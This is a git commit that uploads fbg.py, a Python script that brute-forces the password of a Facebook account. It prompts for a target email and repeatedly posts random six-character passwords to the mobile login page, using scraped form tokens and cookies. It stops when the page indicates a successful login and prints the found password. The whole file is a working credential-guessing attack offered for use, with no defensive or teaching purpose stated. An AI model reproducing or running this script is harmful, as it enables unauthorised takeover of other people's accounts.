58a05dcaad0aa59e9c46847e64a53fb338dc6519
Pikachu <58916687+4HCAEL@users.noreply.github.com>
2022-05-16 12:55:17 +0000

    Add files via upload

---
+++ fbg.py
@@ -0,0 +1,57 @@
+import os.path
+import random
+import requests
+from bs4 import BeautifulSoup
+import sys
+n="abcdefghijklmnopqrstuvwxyz"
+m="1234567890"
+jiaby=n+m
+if sys.version_info[0] != 3:
+    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
+    fb.py\n\t--------------------------------------''')
+    sys.exit()
+
+leng = 6
+POST_URL = 'https://free.facebook.com/login.php'
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+}
+PAYLOAD = {}
+COOKIES = {}
+
+
+def create_form():
+    form = dict()
+    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
+
+    data = requests.get(POST_URL, headers=HEADERS)
+    for i in data.cookies:
+        cookies[i.name] = i.value
+    data = BeautifulSoup(data.text, 'html.parser').form
+    if data.input['name'] == 'lsd':
+        form['lsd'] = data.input['value']
+    return form, cookies
+
+
+def is_this_a_password(email,password):
+    global PAYLOAD, COOKIES
+    PAYLOAD, COOKIES = create_form()
+    PAYLOAD['email'] = email
+    PAYLOAD['pass'] = password
+    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
+    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
+        open('temp', 'w').write(str(r.content))
+        print('\npassword found is: ', password)
+        return True
+    return False
+
+if __name__ == "__main__":
+    print('\n----------[ Welcome ]----------\n')
+    email = input('Enter target: ').strip()
+    while True:
+        password ="".join(random.sample(jiaby,leng))
+        if len(password) < leng:
+            continue
+        print("Trying password : ", password)
+        if is_this_a_password(email, password):
+            break
